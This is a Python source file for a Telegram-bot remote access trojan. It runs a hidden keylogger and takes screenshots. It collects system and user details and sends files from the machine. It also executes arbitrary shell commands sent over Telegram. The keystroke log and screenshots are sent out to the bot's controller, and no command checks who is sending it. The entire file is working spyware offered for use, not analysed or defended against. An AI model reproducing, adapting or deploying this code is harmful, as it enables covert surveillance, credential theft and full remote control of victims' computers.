import telebot
from datetime import datetime
import json
import random
import pyautogui #sudo apt-get install python3-tk python3-dev scrot
import platform
import os
import subprocess

print('MADE BY @DROGI17')



import threading

from pynput.keyboard import Key, Listener
import logging


version = 'v1'




f = open('settings.json', "r")
json_file       = f.read()
f.close()
settings_f      = json.loads(json_file)
api_key         = settings_f['api_key']
bot             = telebot.TeleBot(api_key)

def usr_n(usr_id, name, message):
    log_s = str(usr_id) + ': @' + str(name) + ' -- ' + str(message) + '  --  ' + str(datetime.now().strftime("%d.%m.%Y"))
    # file = open('log_mess.txt', "a")
    # file.write(log_s.replace('\n', '/n') + '\n')
    # file.close()
    print(log_s)




################## KEY LOGGER
log_dir = r"key_log/"
logging.basicConfig(filename=(log_dir + "keyLog.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')
def on_press(key):
    logging.info(str(key))


def key_logger():
    with Listener(on_press=on_press) as listener:
        listener.join()

key_logg = threading.Thread(target=key_logger)
key_logg.start()
##################



def os_data_get():
    os_data = 'User: ' + str(os.getlogin()) + '\n\n'
    os_data += 'System capacity: ' + str(platform.machine()) + '\n\n'
    os_data += 'Version: ' + str(platform.version()) + '\n\n'
    os_data += 'Platform: ' + str(platform.platform()) + '\n\n'
    os_data += 'System: ' + str(platform.system()) + '\n\n'
    os_data += 'Uname: ' + str(platform.uname()) + '\n\n'
    return os_data





####################################################################

print('Started ')


@bot.message_handler(commands=['start'])
def start_message(message):
    usr_n(message.chat.id, message.from_user.username, message.text)
    markup = telebot.types.ReplyKeyboardMarkup(True, False)
    markup.row("/help")
    bot.send_message(message.chat.id, 'Select an action: ', reply_markup=markup)

@bot.message_handler(commands=['os_data'])
def os_data_1(message):
    usr_n(message.chat.id, message.from_user.username, message.text)
    markup_h = telebot.types.ReplyKeyboardRemove()
    os_data = os_data_get()
    bot.send_message(message.chat.id, os_data, reply_markup=markup_h)

@bot.message_handler(commands=['this_directory'])
def this_directory(message):
    usr_n(message.chat.id, message.from_user.username, message.text)
    markup_h = telebot.types.ReplyKeyboardRemove()
    os_data = str(os.getcwd())
    bot.send_message(message.chat.id, os_data, reply_markup=markup_h)



@bot.message_handler(commands=['get_file'])
def get_file(message):
    usr_n(message.chat.id, message.from_user.username, message.text)
    if str(message.text) == '/get_file':
        markup_h = telebot.types.ReplyKeyboardRemove()
        bot.send_message(message.chat.id, 'The command is used like this: /get_file <file_dir>', reply_markup=markup_h)
    else:
        direct_ry = str(message.text).replace('/get_file ', '')
        try:
            file = open(direct_ry, 'rb')
            markup_h = telebot.types.ReplyKeyboardRemove()
            bot.send_document(message.chat.id, file, reply_markup=markup_h)
            file.close()
        except:
            markup_h = telebot.types.ReplyKeyboardRemove()
            bot.send_message(message.chat.id, 'ERRIR', reply_markup=markup_h)

@bot.message_handler(commands=['cd'])
def cd(message):
    usr_n(message.chat.id, message.from_user.username, message.text)
    if str(message.text) == '/cd':
        markup_h = telebot.types.ReplyKeyboardRemove()
        bot.send_message(message.chat.id, 'The command is used like this: /cd <dir>', reply_markup=markup_h)
    else:
        direct_ry = str(message.text).replace('/cd ', '')
        os.chdir(direct_ry)
        markup_h = telebot.types.ReplyKeyboardRemove()
        bot.send_message(message.chat.id, 'done', reply_markup=markup_h)


@bot.message_handler(commands=['ls'])
def ls(message):
    usr_n(message.chat.id, message.from_user.username, message.text)
    comand_result = str(subprocess.check_output('ls', stderr=subprocess.STDOUT).decode('utf8'))
    try:
        markup_h = telebot.types.ReplyKeyboardRemove()
        bot.send_message(message.chat.id, comand_result, reply_markup=markup_h)
    except:
        pass


@bot.message_handler(commands=['bash'])
def this_directory(message):
    usr_n(message.chat.id, message.from_user.username, message.text)
    bash_command = str(message.text).replace('/bash ', '')
    try:
        comand_result = str(subprocess.check_output(bash_command, stderr=subprocess.STDOUT).decode('utf8'))
        if comand_result != '':
            markup_h = telebot.types.ReplyKeyboardRemove()
            bot.send_message(message.chat.id, comand_result, reply_markup=markup_h)
        else:
            pass
    except PermissionError:
        markup_h = telebot.types.ReplyKeyboardRemove()
        bot.send_message(message.chat.id, 'Permission denied', reply_markup=markup_h)
    except FileNotFoundError:
        markup_h = telebot.types.ReplyKeyboardRemove()
        bot.send_message(message.chat.id, 'To go to the directory just enter its name', reply_markup=markup_h)
    except:
        markup_h = telebot.types.ReplyKeyboardRemove()
        bot.send_message(message.chat.id, 'ERROR', reply_markup=markup_h)



@bot.message_handler(commands=['help'])
def help(message):
    usr_n(message.chat.id, message.from_user.username, message.text)
    markup = telebot.types.ReplyKeyboardMarkup(True, False)
    markup.row("/os_data")
    markup.row("/screenshot")
    markup.row("/send_key_log")
    markup.row("/this_directory")
    markup.row("/bash ls")
    markup.row("/get_file")
    markup.row("/cd")
    bot.send_message(message.chat.id, 'Select an action: ', reply_markup=markup)




@bot.message_handler(commands=['screenshot'])
def screenshot(message):
    usr_n(message.chat.id, message.from_user.username, message.text)
    img_name = "screenshots/" + str(random.randint(1, 10000)) + ".png"
    pyautogui.screenshot(img_name)
    img = open(img_name, 'rb')
    markup_h = telebot.types.ReplyKeyboardRemove()
    bot.send_photo(message.chat.id, img, reply_markup=markup_h)
    img.close()

@bot.message_handler(commands=['send_key_log'])
def send_key_log(message):
    usr_n(message.chat.id, message.from_user.username, message.text)
    log = open(log_dir + "keyLog.txt", 'rb')
    markup_h = telebot.types.ReplyKeyboardRemove()
    bot.send_document(message.chat.id, log, reply_markup=markup_h)
    log.close()




bot.polling()